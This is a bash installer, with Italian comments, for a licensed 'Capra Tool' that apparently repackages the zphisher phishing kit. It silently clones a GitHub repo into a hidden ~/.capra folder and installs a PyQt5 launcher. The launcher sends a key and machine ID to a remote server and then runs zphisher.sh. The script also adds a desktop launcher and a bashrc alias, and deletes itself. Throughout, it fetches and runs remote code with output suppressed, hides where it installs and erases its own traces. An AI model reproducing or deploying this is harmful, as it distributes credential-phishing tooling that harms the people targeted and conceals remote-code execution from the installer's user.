#!/bin/bash

REPO_RAW="https://raw.githubusercontent.com/luigianck219/ZPHISHER-XORA/main"
INSTALL_DIR="$HOME/.capra"

echo ""
echo "  ██████╗ █████╗ ██████╗ ██████╗  █████╗ "
echo "  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗"
echo "  ██║     ███████║██████╔╝██████╔╝███████║"
echo "  ██║     ██╔══██║██╔═══╝ ██╔══██╗██╔══██║"
echo "  ╚██████╗██║  ██║██║     ██║  ██║██║  ██║"
echo "   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝"
echo ""
echo "  [ CAPRA TOOL INSTALLER ]"
echo ""

# 1. Dipendenze
echo "  [1/4] Preparazione ambiente..."
sudo apt-get update -qq 2>/dev/null
sudo apt-get install -y python3 python3-pip curl wget git php -qq 2>/dev/null
pip3 install PyQt5 requests --quiet 2>/dev/null

# 2. Cartella nascosta
echo "  [2/4] Configurazione sistema..."
mkdir -p "$INSTALL_DIR"
chmod 700 "$INSTALL_DIR"

# 3. Scarica tutto il repo in ~/.capra/
echo "  [3/4] Download componenti..."
cd /tmp
rm -rf ZPHISHER-XORA
git clone https://github.com/luigianck219/ZPHISHER-XORA.git --quiet 2>/dev/null

# Copia i file dalla sottocartella se esiste, altrimenti dalla root
if [ -d "ZPHISHER-XORA/zphisher-master" ]; then
    cp -r ZPHISHER-XORA/zphisher-master/. "$INSTALL_DIR/"
else
    cp -r ZPHISHER-XORA/. "$INSTALL_DIR/"
fi

rm -rf ZPHISHER-XORA
chmod 700 "$INSTALL_DIR"
find "$INSTALL_DIR" -name "*.sh" -exec chmod +x {} \; 2>/dev/null

# 4. Launcher
echo "  [4/4] Finalizzazione..."
curl -fsSL "$REPO_RAW/launcher.py" -o "$INSTALL_DIR/launcher.py" 2>/dev/null

# Se il launcher non è nel repo lo scriviamo direttamente
if [ ! -s "$INSTALL_DIR/launcher.py" ]; then
cat > "$INSTALL_DIR/launcher.py" << 'PYEOF'
import sys, math, random, uuid, subprocess, os, requests
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *

SERVER     = "https://capra-server-production-434c.up.railway.app"
SCRIPT_DIR = os.path.expanduser("~/.capra")
SCRIPT     = os.path.join(SCRIPT_DIR, "zphisher.sh")

BG      = QColor(4, 8, 20)
CARD_BG = QColor(8, 16, 35)
C_CYAN  = QColor(0, 220, 255)
C_PURP  = QColor(140, 60, 255)
C_PINK  = QColor(220, 60, 255)
C_DIM   = QColor(60, 90, 130)

class Ripple(QWidget):
    def __init__(self,parent):
        super().__init__(parent)
        self.setAttribute(Qt.WA_TransparentForMouseEvents)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self._r=0;self._alpha=0;self._cx=0;self._cy=0;self._active=False
        self._timer=QTimer(self,timeout=self._tick,interval=16)
    def start(self,pos):
        self._cx=pos.x();self._cy=pos.y();self._r=0;self._alpha=180;self._active=True
        self.resize(self.parent().size());self.raise_();self.show();self._timer.start()
    def _tick(self):
        self._r+=6;self._alpha-=12
        if self._alpha<=0:self._timer.stop();self._active=False;self.hide()
        self.update()
    def paintEvent(self,e):
        if not self._active:return
        p=QPainter(self);p.setRenderHint(QPainter.Antialiasing)
        col=QColor(0,220,255,max(0,self._alpha))
        p.setPen(QPen(col,2));p.setBrush(QColor(0,220,255,max(0,self._alpha//4)))
        p.drawEllipse(QPointF(self._cx,self._cy),self._r,self._r);p.end()

class MouseTrail(QWidget):
    def __init__(self,parent):
        super().__init__(parent)
        self.setAttribute(Qt.WA_TransparentForMouseEvents)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self._pts=[];QTimer(self,timeout=self._tick,interval=20).start()
    def add_point(self,x,y):
        col=random.choice([C_CYAN,C_PURP,C_PINK,QColor(100,200,255)])
        self._pts.append({"x":x+random.uniform(-4,4),"y":y+random.uniform(-4,4),
            "r":random.uniform(2,5),"alpha":200,"color":col,
            "vx":random.uniform(-1,1),"vy":random.uniform(-2,0)})
    def _tick(self):
        for p in self._pts:p["x"]+=p["vx"];p["y"]+=p["vy"];p["r"]*=0.93;p["alpha"]-=12
        self._pts=[p for p in self._pts if p["alpha"]>0];self.update()
    def paintEvent(self,e):
        if not self._pts:return
        p=QPainter(self);p.setRenderHint(QPainter.Antialiasing);p.setPen(Qt.NoPen)
        for pt in self._pts:
            col=QColor(pt["color"]);col.setAlpha(max(0,int(pt["alpha"])))
            p.setBrush(col);p.drawEllipse(QPointF(pt["x"],pt["y"]),pt["r"],pt["r"])
        p.end()

class ParticleBG(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent)
        self.setAttribute(Qt.WA_TransparentForMouseEvents)
        COLS=[C_CYAN,C_PURP,C_PINK,QColor(100,180,255),QColor(200,100,255)]
        self._pts=[]
        for _ in range(80):
            c=QColor(random.choice(COLS));c.setAlpha(random.randint(60,180))
            self._pts.append({"x":random.uniform(0,520),"y":random.uniform(0,420),
                "r":random.uniform(0.4,2.2),"speed":random.uniform(0.05,0.35),
                "angle":random.uniform(0,2*math.pi),"drift":random.uniform(-0.007,0.007),"color":c})
        QTimer(self,timeout=self._tick,interval=20).start()
    def _tick(self):
        for p in self._pts:
            p["angle"]+=p["drift"]+0.005
            p["x"]+=math.cos(p["angle"])*p["speed"];p["y"]+=math.sin(p["angle"])*p["speed"]*0.7
            if p["x"]<-3:p["x"]=523.0
            if p["x"]>523:p["x"]=-3.0
            if p["y"]<-3:p["y"]=423.0
            if p["y"]>423:p["y"]=-3.0
        self.update()
    def paintEvent(self,e):
        p=QPainter(self);p.setRenderHint(QPainter.Antialiasing)
        p.fillRect(self.rect(),BG)
        g=QRadialGradient(260,210,280);g.setColorAt(0,QColor(10,20,60,60));g.setColorAt(1,QColor(4,8,20,0))
        p.fillRect(self.rect(),QBrush(g));p.setPen(Qt.NoPen)
        for pt in self._pts:p.setBrush(pt["color"]);p.drawEllipse(QPointF(pt["x"],pt["y"]),pt["r"],pt["r"])
        p.end()

class GlowBorder(QFrame):
    def __init__(self,color1=None,color2=None,radius=12,thick=2,parent=None):
        super().__init__(parent)
        self.c1=color1 or C_CYAN;self.c2=color2 or C_PURP
        self.radius=radius;self.thick=thick
        self._phase=random.uniform(0,2*math.pi)
        self.setAttribute(Qt.WA_TranslucentBackground)
        shadow=QGraphicsDropShadowEffect();shadow.setBlurRadius(28)
        shadow.setColor(QColor(0,180,255,80));shadow.setOffset(0,0)
        self.setGraphicsEffect(shadow)
        QTimer(self,timeout=self._tick,interval=16).start()
    def _tick(self):self._phase=(self._phase+0.014)%(2*math.pi);self.update()
    def paintEvent(self,event):
        p=QPainter(self);p.setRenderHint(QPainter.Antialiasing)
        w,h=self.width(),self.height();inset=self.thick+1
        bg_path=QPainterPath()
        bg_path.addRoundedRect(QRectF(inset,inset,w-2*inset,h-2*inset),self.radius,self.radius)
        p.fillPath(bg_path,QBrush(CARD_BG))
        sweep_x=((math.sin(self._phase*0.7)+1)/2)*w
        sweep=QLinearGradient(sweep_x-80,0,sweep_x+80,0)
        sweep.setColorAt(0,QColor(255,255,255,0));sweep.setColorAt(0.5,QColor(255,255,255,16));sweep.setColorAt(1,QColor(255,255,255,0))
        p.fillPath(bg_path,QBrush(sweep))
        border_path=QPainterPath()
        border_path.addRoundedRect(QRectF(self.thick*0.5,self.thick*0.5,w-self.thick,h-self.thick),self.radius,self.radius)
        p.setPen(QPen(QColor(30,55,110),self.thick));p.drawPath(border_path)
        perim=2*(w+h);pos=(self._phase/(2*math.pi))*perim
        fade_t=(math.sin(self._phase*1.5)+1)/2
        r0=int(self.c1.red()*(1-fade_t)+self.c2.red()*fade_t)
        g0=int(self.c1.green()*(1-fade_t)+self.c2.green()*fade_t)
        b0=int(self.c1.blue()*(1-fade_t)+self.c2.blue()*fade_t)
        for offset in range(-80,81,3):
            t=(pos+offset)%perim;ratio=(1.0-(abs(offset)/80.0))**1.8
            col=QColor(r0,g0,b0,int(255*ratio))
            pt1=self._pp(t,w,h);pt2=self._pp((t+3)%perim,w,h)
            pen=QPen(col,self.thick+3*ratio);pen.setCapStyle(Qt.RoundCap)
            p.setPen(pen);p.drawLine(QPointF(*pt1),QPointF(*pt2))
        p.setPen(QPen(QColor(r0,g0,b0,int(35+20*math.sin(self._phase*2))),self.thick+4))
        p.drawPath(border_path);p.end()
    def _pp(self,t,w,h):
        th=self.thick*0.5
        if t<w:return(th+t,th)
        t-=w
        if t<h:return(w-th,th+t)
        t-=h
        if t<w:return(w-th-t,h-th)
        t-=w
        return(th,h-th-t)

class NeonBtn(QWidget):
    clicked=pyqtSignal()
    def __init__(self,text,col1=None,col2=None,parent=None):
        super().__init__(parent)
        self.text=text;self.col1=col1 or C_CYAN;self.col2=col2 or C_PURP
        self._hov=False;self._phase=0.0
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setCursor(Qt.PointingHandCursor)
        fm=QFontMetrics(QFont("Consolas",10,QFont.Bold))
        self.setFixedSize(fm.horizontalAdvance(text)+52,42)
        self.ripple=Ripple(self)
        self._htimer=QTimer(self,timeout=self._tick,interval=16)
        self._shadow=QGraphicsDropShadowEffect()
        self._shadow.setBlurRadius(0);self._shadow.setColor(QColor(0,220,255,0));self._shadow.setOffset(0,0)
        self.setGraphicsEffect(self._shadow)
    def _tick(self):
        self._phase=(self._phase+0.07)%(2*math.pi)
        if self._hov:
            fade=(math.sin(self._phase)+1)/2
            r=int(self.col1.red()*(1-fade)+self.col2.red()*fade)
            g=int(self.col1.green()*(1-fade)+self.col2.green()*fade)
            b=int(self.col1.blue()*(1-fade)+self.col2.blue()*fade)
            self._shadow.setColor(QColor(r,g,b,160));self._shadow.setBlurRadius(22)
        self.update()
    def enterEvent(self,e):self._hov=True;self._htimer.start();self.update()
    def leaveEvent(self,e):self._hov=False;self._htimer.stop();self._shadow.setBlurRadius(0);self.update()
    def mousePressEvent(self,e):self.ripple.start(e.pos());self.clicked.emit()
    def paintEvent(self,e):
        p=QPainter(self);p.setRenderHint(QPainter.Antialiasing)
        w,h=self.width(),self.height()
        rect=QRectF(2,2,w-4,h-4);path=QPainterPath();path.addRoundedRect(rect,9,9)
        if self._hov:
            fade=(math.sin(self._phase)+1)/2
            r=int(self.col1.red()*(1-fade)+self.col2.red()*fade)
            g=int(self.col1.green()*(1-fade)+self.col2.green()*fade)
            b=int(self.col1.blue()*(1-fade)+self.col2.blue()*fade)
            grad=QLinearGradient(0,0,w,h)
            grad.setColorAt(0,QColor(r//5,g//5,b//5,230));grad.setColorAt(1,QColor(r//8,g//8,b//8,230))
            p.fillPath(path,QBrush(grad));p.setPen(QPen(QColor(r,g,b,220),1.8));p.drawPath(path)
            sx=((math.sin(self._phase*0.8)+1)/2)*w
            sw=QLinearGradient(sx-30,0,sx+30,0)
            sw.setColorAt(0,QColor(255,255,255,0));sw.setColorAt(0.5,QColor(255,255,255,28));sw.setColorAt(1,QColor(255,255,255,0))
            p.fillPath(path,QBrush(sw));txt_col=QColor(220,240,255)
        else:
            p.fillPath(path,QBrush(QColor(8,16,35,230)))
            p.setPen(QPen(QColor(self.col1.red()//3+30,self.col1.green()//3+30,self.col1.blue()//3+30,180),1.5))
            p.drawPath(path)
            txt_col=QColor(self.col1.red()//2+70,self.col1.green()//2+70,self.col1.blue()//2+70)
        p.setFont(QFont("Consolas",10,QFont.Bold));p.setPen(txt_col)
        p.drawText(QRectF(0,0,w,h),Qt.AlignCenter,self.text);p.end()

class NeonInput(QLineEdit):
    def __init__(self,ph="",parent=None):
        super().__init__(parent)
        self.setPlaceholderText(ph);self.setFont(QFont("Consolas",11));self.setFixedHeight(40)
        self.setStyleSheet("""
            QLineEdit{background:#040814;color:#b4d4f0;border:1.5px solid #1a3060;
                border-radius:8px;padding:0 14px;selection-background-color:#5020a0;}
            QLineEdit:focus{border:1.5px solid #00dcff;color:#e8f4ff;}
        """)

class StatusWidget(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent)
        self.setFixedHeight(44)
        self._text="";self._color=QColor(100,100,150);self._phase=0.0;self._anim=False
        self._timer=QTimer(self,timeout=self._tick,interval=16)
    def set_loading(self,txt):
        self._text=txt;self._color=QColor(140,60,255);self._anim=True;self._timer.start();self.update()
    def set_ok(self,txt):
        self._text=txt;self._color=QColor(0,220,140);self._anim=False;self._timer.stop();self.update()
    def set_error(self,txt):
        self._text=txt;self._color=QColor(255,60,80);self._anim=False;self._timer.stop();self.update()
    def clear(self):
        self._text="";self._anim=False;self._timer.stop();self.update()
    def _tick(self):self._phase=(self._phase+0.08)%(2*math.pi);self.update()
    def paintEvent(self,e):
        if not self._text:return
        p=QPainter(self);p.setRenderHint(QPainter.Antialiasing)
        w,h=self.width(),self.height()
        path=QPainterPath();path.addRoundedRect(QRectF(0,2,w,h-4),8,8)
        col=QColor(self._color);col.setAlpha(25);p.fillPath(path,QBrush(col))
        border_col=QColor(self._color)
        if self._anim:border_col.setAlpha(int(120+100*math.sin(self._phase)))
        else:border_col.setAlpha(180)
        p.setPen(QPen(border_col,1.2));p.drawPath(path)
        dot_col=QColor(self._color)
        if self._anim:dot_col.setAlpha(int(150+100*math.sin(self._phase)))
        p.setPen(Qt.NoPen);p.setBrush(dot_col);p.drawEllipse(QPointF(18,h/2),5,5)
        p.setFont(QFont("Consolas",10));p.setPen(QColor(self._color))
        p.drawText(QRectF(34,0,w-40,h),Qt.AlignVCenter|Qt.AlignLeft,self._text);p.end()

class Launcher(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Capra Launcher")
        self.setFixedSize(520,420)
        self.setMouseTracking(True)
        self.bg=ParticleBG(self);self.bg.setGeometry(0,0,520,420)
        self.trail=MouseTrail(self);self.trail.setGeometry(0,0,520,420);self.trail.raise_()
        root=QWidget(self);root.setGeometry(0,0,520,420)
        root.setAttribute(Qt.WA_TranslucentBackground)
        lay=QVBoxLayout(root);lay.setContentsMargins(30,30,30,30);lay.setSpacing(16)
        lay.setAlignment(Qt.AlignCenter)
        top=QHBoxLayout();top.setSpacing(14)
        logo=QLabel("🐐");logo.setFont(QFont("Segoe UI Emoji",32))
        logo.setStyleSheet("background:transparent;");top.addWidget(logo)
        tc=QVBoxLayout();tc.setSpacing(2)
        t1=QLabel("CAPRA TOOL");t1.setFont(QFont("Consolas",18,QFont.Bold))
        t1.setStyleSheet("color:#a060ff;background:transparent;letter-spacing:3px;")
        t2=QLabel("Launcher  v1.0");t2.setFont(QFont("Consolas",9))
        t2.setStyleSheet("color:#2a4a6a;background:transparent;")
        tc.addWidget(t1);tc.addWidget(t2);top.addLayout(tc);top.addStretch()
        lay.addLayout(top)
        card=GlowBorder(C_CYAN,C_PURP,radius=14,thick=2)
        cl=QVBoxLayout(card);cl.setContentsMargins(22,18,22,18);cl.setSpacing(10)
        lbl=QLabel("LICENZA KEY");lbl.setFont(QFont("Consolas",8,QFont.Bold))
        lbl.setStyleSheet("color:#7060c0;background:transparent;");cl.addWidget(lbl)
        self.key_inp=NeonInput("Incolla qui la tua key...")
        self.key_inp.returnPressed.connect(self._launch);cl.addWidget(self.key_inp)
        mid=str(uuid.getnode())
        mr=QHBoxLayout();mr.setSpacing(6)
        ml=QLabel(f"🖥  Machine ID:  {mid}");ml.setFont(QFont("Consolas",8))
        ml.setStyleSheet("color:#1a3a5a;background:transparent;");mr.addWidget(ml);mr.addStretch()
        mc=QPushButton("⧉");mc.setFixedSize(24,24);mc.setCursor(Qt.PointingHandCursor)
        mc.setStyleSheet("background:transparent;color:#1a3a5a;border:none;font-size:13px;")
        mc.clicked.connect(lambda:QApplication.clipboard().setText(mid));mr.addWidget(mc)
        cl.addLayout(mr);lay.addWidget(card)
        self.status=StatusWidget();lay.addWidget(self.status)
        br=QHBoxLayout();br.setAlignment(Qt.AlignCenter)
        self.launch_btn=NeonBtn("🚀  AVVIA TOOL",C_PURP,C_CYAN)
        self.launch_btn.clicked.connect(self._launch);br.addWidget(self.launch_btn)
        lay.addLayout(br)
        foot=QLabel("La key è legata al tuo PC  •  Non condividerla")
        foot.setAlignment(Qt.AlignCenter);foot.setFont(QFont("Consolas",8))
        foot.setStyleSheet("color:#0e1e30;background:transparent;");lay.addWidget(foot)

    def mouseMoveEvent(self,e):
        self.trail.add_point(e.x(),e.y());super().mouseMoveEvent(e)

    def _launch(self):
        key=self.key_inp.text().strip()
        if not key or key=="Incolla qui la tua key...":
            self.status.set_error("Inserisci la tua key!");return
        machine_id=str(uuid.getnode())
        self.status.set_loading("Verifica in corso...")
        self.launch_btn.setEnabled(False)
        QApplication.processEvents()
        try:
            r=requests.post("https://capra-server-production-434c.up.railway.app/verify",
                json={"key":key,"machine_id":machine_id},timeout=10)
            d=r.json()
            if d.get("valid"):
                name=d.get("client_name","")
                self.status.set_ok(f"✅  Benvenuto {name}!  Avvio in corso...")
                QApplication.processEvents()
                QTimer.singleShot(1200,self._run_script)
            else:
                reason=d.get("reason","Key non valida")
                self.status.set_error(f"❌  {reason}")
                self.launch_btn.setEnabled(True)
        except Exception as e:
            self.status.set_error(f"❌  Errore: {e}")
            self.launch_btn.setEnabled(True)

    def _run_script(self):
        if not os.path.exists(SCRIPT):
            self.status.set_error("❌  Script non trovato!")
            self.launch_btn.setEnabled(True);return
        try:
            terminals=[
                ["x-terminal-emulator","-e",f"bash '{SCRIPT}'"],
                ["gnome-terminal","--","bash",SCRIPT],
                ["xterm","-e",f"bash '{SCRIPT}'"],
                ["konsole","-e",f"bash '{SCRIPT}'"],
            ]
            for term in terminals:
                try:
                    subprocess.Popen(term,cwd=SCRIPT_DIR);self.status.set_ok("✅  Tool avviato!")
                    QTimer.singleShot(2000,self.close);return
                except FileNotFoundError:continue
            # fallback senza terminale grafico
            subprocess.Popen(["bash",SCRIPT],cwd=SCRIPT_DIR)
            self.status.set_ok("✅  Tool avviato!")
            QTimer.singleShot(2000,self.close)
        except Exception as e:
            self.status.set_error(f"❌  Errore: {e}")
            self.launch_btn.setEnabled(True)

if __name__=="__main__":
    app=QApplication(sys.argv)
    app.setStyle("Fusion")
    pal=QPalette();pal.setColor(QPalette.Window,QColor(4,8,20));app.setPalette(pal)
    w=Launcher();w.show()
    sys.exit(app.exec_())
PYEOF
fi

chmod +x "$INSTALL_DIR/launcher.py"

# Collegamento desktop
DESKTOP="$HOME/Desktop/CapraLauncher.desktop"
cat > "$DESKTOP" << EOF2
[Desktop Entry]
Version=1.0
Type=Application
Name=Capra Launcher
Exec=python3 $INSTALL_DIR/launcher.py
Icon=terminal
Terminal=false
Categories=Application;
EOF2
chmod +x "$DESKTOP"

# Alias nel bashrc
grep -q "alias capra=" "$HOME/.bashrc" || echo "alias capra='python3 $INSTALL_DIR/launcher.py'" >> "$HOME/.bashrc"

echo ""
echo "  ✅  Installazione completata!"
echo "  Avvia con: python3 ~/.capra/launcher.py"
echo "  Oppure digita: capra  (dopo aver riaperto il terminale)"
echo ""
echo "  Buon divertimento! 🐐"
echo ""

# Auto-cancella l'installer
rm -- "$0"
